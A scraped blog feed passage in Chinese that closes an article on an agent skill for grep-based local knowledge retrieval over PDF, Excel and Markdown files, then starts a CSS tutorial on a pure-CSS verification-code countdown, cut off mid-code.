<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc46a013f25340b6a68452171a279d25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=3Ty02p84NnV1cSGxH%2Bkkm7W2g7w%3D" alt="" loading="lazy"/></p>
<p>检索结果如下，因为首次需要定位文件、转换 PDF 文件，耗时还是比较长的，但是检索到的信息非常准确， 大家在实际使用的时候可以把所有的 PDF 都提前转成 Markdown，效率会高很多。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14e3a09331b84a8db203ed418473cfc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=pv%2BjOjK79gY1ejUTaxzAS%2FHcTPM%3D" alt="" loading="lazy"/></p>
<p>接下来我们继续追问这个文件的问题（介绍三一重工的母公司资产负债表），速度就会快很多了：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4934c4356064d19a14f1f48123b0558~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=PXRb25d84oQy7hnZ6H8k1TG6ggI%3D" alt="" loading="lazy"/></p>
<p>接下来，我们问另外一个文件的问题：</p>
<blockquote>
<p>航天动力前十股东总持股？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f62090bca104f5b92d7a7a9b00dc2ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=lkSP8UbuWh7wapK%2BnG6FY7QdoRw%3D" alt="" loading="lazy"/></p>
<p>这时我们观察一下它的执行流程（整个过程是非常智能化的）：</p>
<ul>
<li>首先通过 Glob 匹配 “航天动力” 这几个关键字，定位到文件</li>
<li>然后调用 Python 工具将航天动力财报的 PDF 文件处理成 txt</li>
<li>接下来根据用户的问题，自己拆解出需要匹配的关键字（股东信息、前 10 名股东 ...）</li>
<li>根据初步匹配到的信息，去文件特定行数检索（offset=380 limit 260）</li>
<li>然后发现这些信息不足以回答问题，再检索更多上下文（offset=520 limit=260）</li>
</ul>
<p>下面，我们尝试问另外一个电商领域的问题：</p>
<blockquote>
<p>郑雪买了啥？</p>
</blockquote>
<p>要回答这个问题需要分析两个 Excel 表：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/650b6f3e21cf474e822470d20f18f205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=99IVGeb8b1X0dzyhL3qiMvqqRXg%3D" alt="" loading="lazy"/></p>
<ul>
<li>通过顾客表找到名叫郑雪的客户的 ID</li>
<li>在订单表根据客户 ID 找到购买的商品</li>
</ul>
<p>看一下分析结果，依然准确找到了数据：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbbd2f1a318945ef94b72935d2863edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=hXHJBQnoDiIHhNoT8e1%2BYEN40cw%3D" alt="" loading="lazy"/></p>
<p>我们再追问一个更复杂的问题：有哪些用户买了 儿童绘本 ，在什么时间？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a505f87a8d784446bd19131deaea8c4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=Pc0hqg7Sp9oOx42GdE7zUusPVFw%3D" alt="" loading="lazy"/></p>
<p>这次 Agent 更快的给出了结果，这个过程已经比较接近于我理想的 AI 智能知识检索的形态了，大家觉得怎么样呢。</p>
<h2 data-id="heading-3">原理介绍</h2>
<p>下面，我们来看看这个 Skill 的实现原理，对于一个能执行 Skill  的 Agent（如 opencode)，本身它已经具备了一些基础的文件检索能力（ls、grep、glob），我们只需要在这个 Skill 中教会 AI 如何更好的使用这些能力：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3198c909fbee43b8be613e1d5fd43f98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=frAnedPtr0krsokNZla80AHoFU8%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>定位领域</strong>：通过分析用户的问题，然后结合知识库的目录索引定位出知识可能存在的领域（文件夹）。</li>
<li><strong>定位文件</strong>：使用 grep 这样的方式在指定目录、文件里筛选出「可能相关的文件」，然后再按需用不同工具去读取这些文件的关键部分。</li>
<li><strong>定位内容</strong>：针对不同文件类型用不同策略：
<ul>
<li><strong>Markdown / 文本</strong>：直接定位到匹配段落，结合上下文分析</li>
<li><strong>PDF</strong>：编写代码调用专门的 PDF 能力按页、按章节提取内容</li>
<li><strong>Excel</strong>：编写代码读取 Excel，然后只看跟问题相关的表、行、列，而不是把整份表格搬出来</li>
</ul>
</li>
</ul>
<p>这里有两条关键设计原则：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9986cc905cf841ef92d13ba594cb1bf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=voG2rPHfmr872kZizVaqWUFuC7c%3D" alt="" loading="lazy"/></p>
<ul>
<li>渐进式检索：尽量少读但读准，优先查「最可能有答案」的文件，读取文件内容时仅读取相关行，必要时再扩展范围，避免无意义的 Token 消耗。</li>
<li>保持简单可控：用户只需要告诉它知识库在什么位置，其余的检索策略都由 skill 自动完成。</li>
</ul>
<p>另外想要让知识检索的更高效和精准，还有两个技巧：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ac36be32785418ba0cd5f3e28edc43e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=znb7kbJXL%2F57vu%2B2grKq7mlUY7Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>文件夹尽量按领域划分，每个文件夹下只包含特定领域下的文件</li>
<li>每个文件夹下都有一个目录索引文件 data_structure.md（如果文件命名不规范、且包含 PDF 等非纯文本的文件格式，这个是必要的），这个文件中描述了当前文件夹下每个文件的用途（这里参考了 Skill 的渐进式披露的设计原则，如果有多级嵌套领域（目录），AI 找到了这个领域后才会读取这个领域的目录索引）。</li>
</ul>
<hr/>
<p>那这个 Skill 怎么实现呢，其实你把上面我们提到的核心流程、设计原则、关键技巧给到我们上个教程中讲到的 skill-creator 这个 skill ，AI 自己就帮我们创建出来了，我们只需要经过细微的调整，下面我们来看下我们的 Skill 的目录结构：</p>
<ul>
<li><strong>SKILL.md</strong> ：是这个技能的使用说明书，里面描述了如何找到本地知识库目录、如何根据目录索引逐层检索知识、对不同文件的处理方式（参考哪个文档）、最终的回答风格等等</li>
<li><strong>references</strong>：放置 PDF、Excel 等特殊文件类型的解析方法，只有确定当前知识需要具体分析一个 PDF、Excel 或其他特殊的文件类型时，再查阅详细的处理文档，可以节省 Token 和注意力。</li>
<li><strong>scripts</strong>：放置 PDF 文件的特殊处理脚本（如解析 PDF、PDF 转图片等等）</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf7138ec81b0474aaaf4ee994b2c9f0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=FzNnrM6BuZ2VFsBbeyx0DTui%2F4E%3D" alt="" loading="lazy"/></p>
<p>我们可以把这套方案可以理解为「不预建向量库的、本地目录级、渐进式检索 RAG」，的优势主要在于：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb0fb9ed203f405bbd1c762a6f382fbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=A05YpDlCT0vqsIb3n65PRRd36FY%3D" alt="" loading="lazy"/></p>
<ul>
<li>不需要预建索引 / 向量数据库，更轻量简单，适合快速搭建本地个人知识库的场景；</li>
<li>检索更智能，传统的 RAG 主要靠向量匹配内容，大模型只做总结，而在这个过程里，大模型可以参与分词、上下文匹配的决策，并且可以进行智能调整，其实就是一个 Agentic RAG 的工作模式。</li>
</ul>
<p>当前这只是一个初步的尝试，它还有一定的缺陷：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24377c8d45f1406091234daf36763f1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=xocurE9mIUFDW0TnrAnw9m5GnkM%3D" alt="" loading="lazy"/></p>
<ul>
<li>首次检索的效率问题：如果分析到的文件是一个 PDF 或其他特殊格式，需要先调用脚本进行转换，首次效率低（推荐预处理为纯文本）</li>
<li>Skill 调用稳定性：在多轮检索后，AI 可能会忘记去调用 Skill（第一次命中率还是比较高的），从而丢失一些关键的处理步骤，这个在很多其他的 Skill 上也会有类似的问题，可能需要从 Agent 层面解决。</li>
<li>Token 消耗更大：因为整个检索过程是 AI 控制的，当首次没有检索到想要的答案，AI 会继续切换一些新的参数或文件进行检索，直到找到最终结果，虽然结果更准确，但也更消耗 Token。</li>
</ul>
<h2 data-id="heading-4">让已有文档站秒变知识库</h2>
<p>刚刚我们介绍的 Skill 是一个通用的知识检索的尝试，但如果你有一个固定格式的知识库（比如一个文档站，里面已经包含了多个本地文件），你可以通过 Skill Creator 让它去自己分析你的文档站，然后创建出符合你的文档站风格的知识检索 Skill，我们可以在一个已有文档站下输入下面的提示词：</p>
<blockquote>
<p>当前项目是一个文档站（包含多个 md、mdx 文件），我想创建一个专用于知识库检索的 Skill，它可以替代传统的 RAG ，用于当前文章站的知识检索，你来帮我创建这个 Skill（使用中文）。Skills 的基本思路是，先根据用户的问题，提取出需要检索的可能关键字，然后使用 Grep 命令找到对应的上下文。然后分析上下文，如果检索到的信息和问题不符合需要继续检索其他可能关键字，最大重试五次。</p>
</blockquote>
<p>我们尝试在 Easy Dataset 文档站（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset-docs%25EF%25BC%2589%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AASkill" target="_blank" title="https://github.com/ConardLi/easy-dataset-docs%EF%BC%89%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASkill" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a> ：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b862b53001624aa585ae04f286e6b2af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=qCe7Xf7kp%2BG9Kk7UqrtEJB7kLtw%3D" alt="" loading="lazy"/></p>
<p>下面尝试问个问题：</p>
<blockquote>
<p>检索知识库：如何使用 Easy Dataset 生成评估数据集？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4432fb6b8c74efb81605a131bb254a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=tGN8gqkPLB20vCI8xsUYgVMDi8w%3D" alt="" loading="lazy"/></p>
<p>由于这个文档站全是纯本文文档（没有 PDF 等特殊格式）检索速度非常快而起效果非常不错。</p>
<p>再问个问题：</p>
<blockquote>
<p>检索知识库：Easy Dataset 有哪些分块策略？</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dbce2ec11b34a3fbff5b08b6da135c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698910&amp;x-signature=wIR8PAD2pIQ1cYA1evkKbC7Q%2BzQ%3D" alt="" loading="lazy"/></p>
<p>通过这种模式，你可以把任意已经存在的本地知识库变成一个可以进行智能知识检索的 skill。</p>
<h2 data-id="heading-5">最后</h2>
<p>关注《code秘密花园》从此学习 AI 不迷路，相关链接：</p>
<ul>
<li>本文中用到的知识检索 Skill：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Frag-skill%2F" target="_blank" title="https://github.com/ConardLi/rag-skill/" ref="nofollow noopener noreferrer">github.com/ConardLi/ra…</a></li>
<li>AI 教程完整汇总：<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwR…</a></li>
<li>相关学习资源汇总在：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/ea…</a></li>
</ul>
<p>如果本期对你有所帮助，希望得到一个免费的三连，感谢大家支持！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[纯CSS实现发送验证码读秒倒数 - if函数妙用]]></title>    <link>https://juejin.cn/post/7602146335215599656</link>    <guid>https://juejin.cn/post/7602146335215599656</guid>    <pubDate>2026-02-03T02:39:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335215599656" data-draft-id="7602072652607062056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="纯CSS实现发送验证码读秒倒数 - if函数妙用"/> <meta itemprop="keywords" content="CSS,前端"/> <meta itemprop="datePublished" content="2026-02-03T02:39:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="juejin_cn"/> <meta itemprop="url" content="https://juejin.cn/user/3016715636324125"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            纯CSS实现发送验证码读秒倒数 - if函数妙用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3016715636324125/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    juejin_cn
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:39:29.000Z" title="Tue Feb 03 2026 02:39:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>点击发送短信验证码倒数60秒后可重新发送，借助 <code>if()</code> 纯 CSS 也能实现这样的效果。</p>
<blockquote>
<p>要求 Chrome/Edge ≥ 137</p>
</blockquote>
<p><span href="https://code.juejin.cn/pen/7602229993149562916" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7602229993149562916" data-src="https://code.juejin.cn/pen/7602229993149562916" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<ul>
<li>
<p><code>@property</code> 是 CSS Houdini API 的一部分，用来定义 CSS 自定义属性。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@property</span> --num {
  syntax: <span class="hljs-string">"&lt;integer&gt;"</span>;
  initial-value: <span class="hljs-number">0</span>;
  inherits: true;
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>if()</code> 允许根据条件测试的结果为属性设置不同的值。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span> {
  <span class="hljs-attr">--num</span>: <span class="hljs-built_in">var</span>(--sec);
  counter-set: count <span class="hljs-built_in">var</span>(--num);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): blue; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): blue; else: <span class="hljs-number">#999</span>; );
  <span class="hljs-attribute">pointer-events</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-built_in">var</span>(--sec)): initial; style(<span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>): initial; else: none; );
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>counter()</code> 返回一个代表计数器的当前值的字符串。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>)<span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-built_in">if</span>(<span class="hljs-built_in">style</span>(--num: <span class="hljs-number">0</span>): <span class="hljs-string">"重新发送"</span>; else: <span class="hljs-built_in">counter</span>(count) <span class="hljs-string">"秒后可重新发送"</span>; );
}
</code></pre>
</li>
<li>
<p>CSS 函数 <code>steps()</code> 定义了一个过渡效果，将输入时间划分为指定数量的等长间隔。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">label</span><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:checked</span>) {
  <span class="hljs-attr">--num</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transition</span>: --num <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--sec) * <span class="hljs-number">1s</span>) <span class="hljs-built_in">steps</span>(<span class="hljs-built_in">var</span>(--sec), jump-start);
}
</code></pre>
</li>
</ul>
<p>完整代码：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
